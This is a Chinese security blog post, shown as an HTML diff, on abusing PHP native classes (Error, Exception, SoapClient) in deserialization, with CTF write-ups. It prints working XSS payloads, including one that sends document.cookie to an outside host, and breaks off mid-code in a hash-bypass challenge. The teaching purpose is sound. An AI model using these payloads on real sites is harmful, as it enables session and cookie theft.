@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这一篇的主要内容是php中的一些原生类的原理及其利用，目前只记录了Error(Exception类与其大致相同只是php版本不同)和SoapClient这两个原生类。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php原生类的利用">
+<meta property="og:url" content="http://example.com/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="这一篇的主要内容是php中的一些原生类的原理及其利用，目前只记录了Error(Exception类与其大致相同只是php版本不同)和SoapClient这两个原生类。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272236192.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272236420.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235075.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235464.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235645.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272235083.png">
+<meta property="article:published_time" content="2025-02-18T02:34:46.000Z">
+<meta property="article:modified_time" content="2025-04-27T14:51:04.560Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202504272236192.png">
+
+<link rel="canonical" href="http://example.com/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>php原生类的利用 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php原生类的利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-18 10:34:46" itemprop="dateCreated datePublished" datetime="2025-02-18T10:34:46+08:00">2025-02-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-27 22:51:04" itemprop="dateModified" datetime="2025-04-27T22:51:04+08:00">2025-04-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这一篇的主要内容是php中的一些原生类的原理及其利用，目前只记录了Error(Exception类与其大致相同只是php版本不同)和SoapClient这两个原生类。</p>
+<span id="more"></span>
+
+<h1 id="php中的内置类"><a href="#php中的内置类" class="headerlink" title="php中的内置类"></a>php中的内置类</h1><h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
+<p><strong>类摘要：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;   <span class="comment">#错误消息内容</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;   <span class="comment">#错误代码</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;   <span class="comment">#抛出错误的文件名</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;   <span class="comment">#抛出错误在该文件中的行数</span></span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span>     <span class="comment">#获取错误信息</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span>     <span class="comment">#返回先前的 Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span>     <span class="comment">#获取错误代码</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span>     <span class="comment">#获取错误发生时的文件</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span>     <span class="comment">#获取错误发生时的行号</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span>     <span class="comment">#获取调用栈（stack trace）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span>     <span class="comment">#获取字符串形式的调用栈（stack trace）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span>     <span class="comment">#error 的字符串表达</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span>     <span class="comment">#克隆 error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="toString方法"><a href="#toString方法" class="headerlink" title="__toString方法"></a><span style="color: orange;">__toString方法</span></h3><p><strong><code>__toString</code>方法用于当一个类被当作字符串时该怎样回应。例如当echo一个类时，便出现了错误，但该怎样去处理这个问题呢？该方法会将错误或异常对象转换为字符串。</strong></p>
+<h2 id="SoapClient类"><a href="#SoapClient类" class="headerlink" title="SoapClient类"></a>SoapClient类</h2><p>PHP的内置类SoapClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的PHP客户端。</p>
+<p>类摘要：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="call方法"><a href="#call方法" class="headerlink" title="__call方法"></a><span style="color: orange;">__call方法</span></h3><p>该类的<code>__call</code>方法被触发后，可以发送HTTP和HTTPS请求。其构造函数如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">SoapClient</span>::<span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [, arry <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>第一个参数用来指明是否是wsdl模式，将该值设置为null则表示非wsdl模式。</li>
+<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri是SOAP服务的目标命名空间。</li>
+</ol>
+<h1 id="使用Error-Exception类进行XSS"><a href="#使用Error-Exception类进行XSS" class="headerlink" title="使用Error&#x2F;Exception类进行XSS"></a>使用Error&#x2F;Exception类进行XSS</h1><p>注意：</p>
+<ul>
+<li>要在开启报错的前提下。</li>
+<li>Error只适用于php7，Exception适用于php 5或7</li>
+</ul>
+<p>通常在反序列化中，如果有个POP链走到一半就走不通了，不如尝试利用Error&#x2F;Exception类的__toString()方法来做一个xss。</p>
+<h2 id="xss演示"><a href="#xss演示" class="headerlink" title="xss演示"></a>xss演示</h2><p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Ming&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Tong&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//输出:</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A30%3A%22%3Cscript%3Ealert%28%27Tong%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A69%3A%22D%3A%5Cweb_soft_home%5Cphpstudy_pro%5CWWW%5Ceclipse_workspace%5Cfirstpro%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功弹窗</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272236192.png" alt="image-20250123211130604"  />
+
+<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>先Git泄漏，得到如下内容：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>一个GET传参一个反序列化函数，可能是反序列化但是连一个类也不给，无法构造POP链啊，这时候就要想到利用php内置类来打了</p>
+<p>不过这道题明说了是xss，有关xss的题flag一般都在Cookie中，所以可以直接<code>document.Cookie</code>运行，flag就出来了。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272236420.png" alt="image-20250123213358078"  />
+
+<p>不过这种情况很少见，还是学一个正经点的方法：利用php内置类反序列化打xss</p>
+<h3 id="xss的payload构造"><a href="#xss的payload构造" class="headerlink" title="xss的payload构造"></a><span style="color: orange;">xss的payload构造</span></h3><p><code>window.open()</code>打开新窗口</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://ed527973-7ba3-455a-b532-de236f21b2a9.node5.buuoj.cn&#x27;</span></span><br><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(url+<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>window.location.href</code>实现恶意跳转</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=url+<span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POC如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://ed527973-7ba3-455a-b532-de236f21b2a9.node5.buuoj.cn&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>然后直接访问下面的URL即可</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://ed527973-<span class="number">7</span>ba3-<span class="number">455</span>a-b532-de236f21b2a9.node5.buuoj.cn:<span class="number">81</span>/?yds_is_so_beautiful=O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>Error%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fed527973-<span class="number">7</span>ba3-<span class="number">455</span>a-b532-de236f21b2a9.node5.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Error%<span class="number">00</span>string%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A69%<span class="number">3</span>A%<span class="number">22</span>D%<span class="number">3</span>A%<span class="number">5</span>Cweb_soft_home%<span class="number">5</span>Cphpstudy_pro%<span class="number">5</span>CWWW%<span class="number">5</span>Ceclipse_workspace%<span class="number">5</span>Cfirstpro%<span class="number">5</span>Ctest.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Error%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Error%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<h1 id="使用Error-Exception类绕过哈希比较"><a href="#使用Error-Exception类绕过哈希比较" class="headerlink" title="使用Error&#x2F;Exception类绕过哈希比较"></a>使用Error&#x2F;Exception类绕过哈希比较</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>已知Error和Exception类的<code>__toString</code>方法会将错误或异常对象转换为字符串，现在来将这个字符串输出：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hhh&quot;</span>,<span class="number">1</span>);  <span class="comment">//“hhh”是错误内容，第二个参数1是错误代码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>hhh in D:\web_soft_home\phpstudy_pro\WWW\eclipse_workspace\firstpro\test.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现输出的字符串包含当前的错误信息内容、错误文件的绝对路径、错误所在行号，而我们设置的错误代码<code>code</code>并没有被输出。</p>
+<p>看下一个例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hhh&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hhh&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>.<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Error: </span>hhh in D:\web_soft_home\phpstudy_pro\WWW\eclipse_workspace\firstpro\test.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br><span class="line"><span class="keyword">Error: </span>hhh in D:\web_soft_home\phpstudy_pro\WWW\eclipse_workspace\firstpro\test.php:2</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#123;main&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现如果异常内容和所在行号一样，即使错误代码不一样，最后输出的报错字符串也是一样的。当然这两个错误对象本身是不一样的，只是通过<code>__toString</code>方法转换成的字符串是一样的。</p>
+<p>Exception类与Error的使用和结果完全一样，只不过<code>Exception</code>类适用于PHP 5和7，而<code>Error</code>只适用于PHP 7。</p>
+<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span 